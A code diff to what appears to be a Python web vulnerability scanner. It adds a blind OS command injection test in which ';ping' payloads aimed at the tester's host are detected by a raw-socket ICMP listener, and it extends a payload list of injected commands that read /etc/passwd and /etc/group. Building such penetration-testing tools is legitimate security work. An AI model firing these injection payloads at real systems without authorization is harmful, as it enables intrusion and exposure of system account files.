@@ -17,6 +17,7 @@ import socketserver
 import traceback
 import errno
 import fileinput
+import platform
 import urllib.parse as urlparse
 
 from contextlib import closing
@@ -52,6 +53,27 @@ def serve_forever():
         print("[!] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable! Skipping RFI check...")
         pass
 
+class ICMPThread(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.result = None
+
+    def run(self):
+        s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
+        s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
+        self.result = False
+
+        while True:
+            data, addr = s.recvfrom(1024)
+            #icmp = data[20:28]
+            if(data):
+                self.result = True
+
+    def getResult(self):
+        return self.result
+    
+    def setResult(self, boolean):
+        self.result = boolean
 
 def prepareHeaders():
     user_agents = [
@@ -97,7 +119,7 @@ def addToExploits(req, request_type, exploit_type, getVal, postVal, headers, att
     exploits.append(e)
     return e
 
-def init(req, reqType, explType, getVal, postVal, headers, attackType):
+def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInjectable = False):
 
     #Add them from the most complex one to the least complex. This is important.
     #TODO change this shite mechanism, because i don't even remember how this works anymore.
@@ -105,16 +127,23 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType):
                   "cat%20/etc/group|head%20-n%201", "cat%20%2F%2Fetc%2Fpasswd",
                   "cat%20%2F%2Fetc%2Fgroup","file%3A%2F%2F%2Fetc%2Fpasswd%2500", 
                   "file%3A%2F%2F%2Fetc%2Fpasswd", "cat%20/etc/passwd", "cat%20/etc/group",
-                  "///etc/passwd", "/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
+                  "///etc/passwd", "cat /etc/passwd","cat /etc/group",  "/etc/passwd", "file%3A%2F%2F%2Fetc%2Fgroup%2500", 
                   "file%3A%2F%2F%2Fetc%2Fgroup", "file://etc/group%00", "file:///etc/group", 
                   "/etc/group","https://www.google.com/", "rfitest.txt", "ipconfig"]
+    
 
     if(scriptName != ""):
         TO_REPLACE.append(scriptName)
         TO_REPLACE.append(scriptName+".php")
         TO_REPLACE.append(scriptName+"%00")
+   
+    if(args.lhost != None):
+        TO_REPLACE.append("ping -c 1 " + args.lhost)
+        TO_REPLACE.append("ping%20-c%201%20" + args.lhost)
+        TO_REPLACE.append("ping -n 1 " + args.lhost)
+        TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
     
-    if(checkPayload(req)):
+    if(checkPayload(req) or cmdInjectable):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
                 u = getVal.replace(TO_REPLACE[i], tempArg)
@@ -205,17 +234,19 @@ def test_trunc(url):
 
 def test_cmd_injection(url):
     if(args.verbose):
-        print("Testing os command injection...")
+        print("Testing for classic results-based os command injection...")
     
+    # Classing results-based cmd injection test
     if(not args.postreq):
         with open(cmdWordlist) as f:
             for line in f:
                 line = line.replace("\n", "")
+                if(line == ""): continue
                 u = url.replace(args.param, line)
 
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if(init(res, "GET", "RCE", u, "", headers, "CMD")):
-                    break
+                    return
     else:
         with open(cmdWordlist) as f:
             for line in f:
@@ -225,7 +256,36 @@ def test_cmd_injection(url):
                 res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
 
                 if(init(res, "POST", "RCE", url, postTest, headers, "CMD")):
-                    break
+                    return
+    
+    # ICMP exfiltration technique 
+    if(args.lhost):
+        if(args.verbose):
+            print("Testing for blind OS command injection via ICMP exfiltration...")
+
+        t = ICMPThread()
+        t.start()
+
+        icmpTests = []
+        icmpTests.append(";ping%20-c%201%20" + args.lhost)
+        icmpTests.append(";ping%20-n%201%20" + args.lhost)
+    
+        for test in icmpTests:
+            if(args.postreq):
+                postTest = args.postreq.replace(args.param, test)
+                res = requests.post(url, data=postTest, headers = headers, proxies = proxies)
+                if(t.getResult() == True):
+                    t.setResult(False)
+                    if(init(res, "POST", "RCE", url, postTest, headers, "CMD", True)):
+                        return
+            else: 
+                u = url.replace(args.param, test)
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if(t.getResult() == True):
+                    t.setResult(False)
+                    if(init(res, "GET", "RCE", u, "", headers, "CMD", True)):
+                        return
+        
 
 def test_xss(url):
     if(args.verbose):
